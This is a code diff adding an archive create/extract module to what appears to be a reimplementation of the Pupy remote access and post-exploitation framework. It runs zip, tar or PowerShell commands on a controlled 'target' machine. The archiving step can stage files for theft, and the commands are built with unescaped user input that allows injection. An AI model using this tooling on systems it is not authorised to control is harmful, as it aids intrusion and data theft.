@@ -2209,3 +2209,62 @@ class ContactsModule(PupyModule):
             "output": result.get("output", ""),
             "error": result.get("error"),
         }
+
+
+class ZipModule(PupyModule):
+    """Create/extract archives on the target.
+
+    Upstream Pupy's ``zip`` (via zip agent module). Native reimplementation
+    using zip/tar on the host.
+    """
+
+    name = "zip"
+    version = "1.0.0"
+    description = "Create or extract archives on the target"
+    author = "Pupyteer Team"
+    category = ModuleCategory.FILE_OPS
+
+    async def execute(self, session, args):
+        action = str(args.get("action") or "create").lower().strip()
+        archive = str(args.get("archive") or args.get("out") or "").strip()
+        paths = args.get("paths") or args.get("files") or []
+        if isinstance(paths, str):
+            paths = [paths]
+        extract_to = str(args.get("extract_to") or args.get("dest") or ".").strip()
+
+        session_mgr = getattr(self, "_session_manager", None)
+        os_name = getattr(session, "os", "").lower()
+
+        if action == "extract":
+            if "win" in os_name:
+                cmd = f"powershell -Command \"Expand-Archive -Path '{archive}' -DestinationPath '{extract_to}' -Force\""
+            else:
+                cmd = f'unzip -o "{archive}" -d "{extract_to}" 2>/dev/null || tar -xf "{archive}" -C "{extract_to}"'
+        else:
+            if not archive:
+                return {"status": "error", "error": "archive argument is required"}
+            joined = " ".join(f'"{p}"' for p in paths) if paths else "."
+            if "win" in os_name:
+                cmd = f"powershell -Command \"Compress-Archive -Path {joined} -DestinationPath '{archive}' -Force\""
+            else:
+                cmd = f'zip -r "{archive}" {joined} 2>/dev/null || tar -czf "{archive}" {joined}'
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd, "action": action}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "action": action,
+            "archive": archive,
+            "output": result.get("output", ""),
+            "error": result.get("error"),
+        }
+
+    def validate_args(self, args):
+        if not args.get("archive") and not args.get("out"):
+            if str(args.get("action") or "create").lower() != "extract":
+                return ["Missing required argument: archive"]
+        return []
